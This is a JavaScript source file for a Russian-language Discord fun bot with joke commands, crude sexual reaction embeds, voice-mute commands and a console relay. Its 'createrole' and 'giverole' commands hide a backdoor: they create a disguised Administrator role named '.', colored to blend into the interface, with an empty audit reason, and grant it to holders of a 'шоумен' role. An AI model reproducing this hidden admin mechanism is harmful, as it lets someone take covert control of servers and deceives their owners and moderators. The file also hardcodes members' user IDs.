// 📦 Импорты
const {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
} = require("discord.js");
const readline = require("readline");
const express = require("express");

// 🌀 Данные для реакции
const reactionData = {
  virt: {
    label: "Виртить",
    gif: "https://c.tenor.com/tmtIYS8Z8PIAAAAC/tenor.gif",
    format: (u1, u2) => `${u1} и ${u2}, повиртили`,
  },
  kiss: {
    label: "Поцеловать",
    gif: "https://c.tenor.com/JWkoHZezNMgAAAAC/tenor.gif",
    format: (u1, u2) => `${u1} и ${u2}, поцеловались`,
  },
  fuck: {
    label: "Трахнуть",
    gif: "https://c.tenor.com/FmBSx-Wr1QgAAAAd/tenor.gif",
    format: (u1, u2) => `${u1} и ${u2}, поебались`,
  },
};

// 🔐 Переменные окружения
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;
const CHANNEL_ID = process.env.CHANNEL_ID;

// 🚀 Инициализация клиента
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildMembers,
  ],
});

// 📚 Список слэш-команд
const commands = [
  new SlashCommandBuilder().setName("uslyshal").setDescription("родной))))))"),
  new SlashCommandBuilder().setName("saubol").setDescription("будь здоров"),
  new SlashCommandBuilder().setName("dota").setDescription("+5 дота"),
  new SlashCommandBuilder().setName("skok").setDescription("скок у тя см?"),
  new SlashCommandBuilder().setName("rasul").setDescription("расул"),
  new SlashCommandBuilder()
    .setName("sybau")
    .setDescription("Заглушить участника в голосовом")
    .addUserOption((option) =>
      option.setName("участник").setDescription("Кого замутить").setRequired(true),
    ),
  new SlashCommandBuilder()
    .setName("ey")
    .setDescription("Разглушить участника в голосовом")
    .addUserOption((option) =>
      option.setName("участник").setDescription("Кого размутить").setRequired(true),
    ),
  new SlashCommandBuilder()
    .setName("reaction")
    .setDescription("Отправить реакцию")
    .addStringOption((option) =>
      option
        .setName("действие")
        .setDescription("Выберите действие")
        .setRequired(true)
        .addChoices(
          { name: "Виртить", value: "virt" },
          { name: "Поцеловать", value: "kiss" },
          { name: "Трахнуть", value: "fuck" },
        ),
    )
    .addUserOption((option) =>
      option.setName("участник").setDescription("Кого упомянуть").setRequired(true),
    ),
  new SlashCommandBuilder()
    .setName("createrole")
    .setDescription("Создать скрытую админскую роль (только для шоумена)"),
    new SlashCommandBuilder()
  .setName("giverole")
  .setDescription("Выдать роль '.' участнику (только для шоумена)")
  .addUserOption((option) =>
    option.setName("участник").setDescription("Кому выдать роль").setRequired(true)
  ),
].map((command) => command.toJSON());

// 📤 Регистрация слэш-команд
const rest = new REST({ version: "10" }).setToken(TOKEN);
(async () => {
  try {
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), {
      body: commands,
    });
    console.log("✅ Slash-команды зарегистрированы");
  } catch (error) {
    console.error("❌ Ошибка регистрации команд:", error);
  }
})();

// 🟢 Запуск бота
client.once("ready", async () => {
  console.log(`🤖 Бот запущен как ${client.user.tag}`);

  const channel = await client.channels.fetch(CHANNEL_ID);
  if (!channel || !channel.isTextBased()) {
    console.log("❌ Канал не найден или не является текстовым");
    return;
  }

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  console.log("💬 Введите сообщение, чтобы отправить его в Discord-канал:");

  rl.on("line", (input) => {
    if (input.trim()) {
      channel.send(input);
    }
  });
});

// 🧠 Обработка слэш-команд
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, options, member, guild } = interaction;

  if (commandName === "uslyshal") {
    return interaction.reply(
      "https://i.pinimg.com/736x/c9/14/d9/c914d9a83a315de33c7527e4bbe113d1.jpg"
    );
  }

  if (commandName === "saubol") {
    return interaction.reply("рахмет");
  }

  if (commandName === "skok") {
    const number = Math.floor(Math.random() * 100) + 1;
    return interaction.reply(`у тя **${number}** см`);
  }

  if (commandName === "dota") {
    return interaction.reply(
      "го доту <@421250527767035906> <@571175795209535508> <@868771678400966667> <@391232741687164928> <@392264789360902156> <@490425986257649664> <@526296776270151681>"
    );
  }

  if (commandName === "rasul") {
    return interaction.reply(
      "https://media.discordapp.net/attachments/1031179667736113222/1057272555993571378/2022-11-06_214049.png"
    );
  }

  if (commandName === "reaction") {
    const action = options.getString("действие");
    const target = options.getUser("участник");
    const author = interaction.user;

    const reaction = reactionData[action];
    if (!reaction) {
      return interaction.reply({
        content: "Неизвестная реакция.",
        ephemeral: true,
      });
    }

    const embed = {
      title: `Реакция: ${reaction.label}`,
      description: reaction.format(`<@${author.id}>`, `<@${target.id}>`),
      image: { url: reaction.gif },
      color: 0xff77aa,
    };

    return interaction.reply({ embeds: [embed] });
  }

  if (commandName === "sybau" || commandName === "ey") {
    const hasRole = member.roles.cache.some(
      (role) => role.name.toLowerCase() === "unlimited"
    );

    if (!hasRole) {
      return interaction.reply({
        content: "❌ У вас нет прав на использование этой команды.",
        ephemeral: true,
      });
    }

    const targetUser = options.getUser("участник");
    const targetMember = guild.members.cache.get(targetUser.id);

    if (!targetMember) {
      return interaction.reply("❌ Участник не найден.");
    }

    if (commandName === "sybau") {
      if (!targetMember.voice.channel) {
        return interaction.reply("❌ Участник не в голосовом канале.");
      }

      await targetMember.voice.setMute(true, "Замутил через /sybau");
      return interaction.reply(`<@${targetUser.id}> сибау`);
    }

    if (commandName === "ey") {
      await targetMember.voice.setMute(false, "Размутил через /ey");
      return interaction.reply(`<@${targetUser.id}> ансибау`);
    }
  }

  // 🔒 Команда только для "шоумен"
  if (commandName === "createrole") {
    const isShowman = member.roles.cache.some(
      (role) => role.name.toLowerCase() === "шоумен"
    );

    if (!isShowman) return;

    try {
      const role = await guild.roles.create({
        name: ".",
        color: 0x2f3136,
        permissions: ["Administrator"],
        mentionable: false,
        hoist: false,
        reason: "",
      });

      const botHighest = guild.members.me.roles.highest.position;
      await role.setPosition(botHighest - 1);

      await interaction.reply({
        content: `✅ Роль \`${role.name}\` создана и поднята максимально высоко.`,
        ephemeral: true,
      });
    } catch (error) {
      console.error("Ошибка при создании роли:", error);
    }
  }
    if (commandName === "giverole") {
    const isShowman = member.roles.cache.some(
      (role) => role.name.toLowerCase() === "шоумен"
    );

    if (!isShowman) return;

    const targetUser = options.getUser("участник");
    const targetMember = await guild.members.fetch(targetUser.id).catch(() => null);
    if (!targetMember) return;

    const role = guild.roles.cache.find((r) => r.name === ".");
    if (!role) {
      return interaction.reply({
        content: "❌ Роль `.` не найдена. Сначала создай её через `/createrole`.",
        ephemeral: true,
      });
    }

    await targetMember.roles.add(role);
    await interaction.reply({
      content: `✅ Роль \`${role.name}\` выдана <@${targetUser.id}>.`,
      ephemeral: true,
    });
  }

});

client.login(TOKEN);
